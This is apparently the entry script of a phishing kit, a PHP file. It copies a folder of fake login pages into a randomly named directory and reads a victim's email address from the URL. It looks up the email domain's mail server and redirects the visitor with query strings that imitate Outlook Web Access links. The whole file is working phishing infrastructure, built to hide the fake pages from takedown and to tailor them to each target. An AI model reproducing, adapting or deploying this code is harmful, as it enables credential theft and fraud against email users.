<?php

include('seke.php');

$random = rand(50000,100000000000);
$dst    = substr(md5($random), 0, 1000000000);

if(isset($_GET['mgs'])){
$msg='mgs=tee';
}else{
$msg='nosmgs=tee';
}
$roll1='';
$roll2='';
$roll3='';
$roll4='';
$roll5='';

function mxrecordValidate($domain) {
$arr = dns_get_record($domain, DNS_MX);
if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])){
return $arr[0]['target'];}}  

$log = base64_encode($loguid);

//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="p";
recurse_copy( $src, $dst );
 
$login = $_GET['uid'];
$varx = $_GET['main_domain'];
 
if(isset($_GET['AllowGuestInvitations1'])){ $roll1 ='AllowGuestInvitations1=On&'; } 
if(isset($_GET['AllowGuestInvitations2'])){ $roll2 ='AllowGuestInvitations2=On&'; } 
if(isset($_GET['AllowGuestInvitations3'])){ $roll3 ='AllowGuestInvitations3=On&'; } 
if(isset($_GET['AllowGuestInvitations4'])){ $roll4 ='AllowGuestInvitations4=On&'; } 
if(isset($_GET['AllowGuestInvitations5'])){ $roll5 ='AllowGuestInvitations5=On&'; }

$domin = substr(strrchr($login, "@"), 1);
$servname= mxrecordValidate($domin);
 

header("location: ".$dst."?{$servname}-Key=".base64_encode($random)."&openurl={$varx}&main_domain={$varx}&fid=1&sessionid={$login}&{$msg}&uid={$login}&{$roll1}{$roll2}{$roll3}{$roll4}{$roll5}rand=13InboxLight.aspx.".base64_encode($random)."1774256418&fid=4#n=1252899642&fid=1&fav=1&?office=&rand=13InboxLight.aspx");

?>
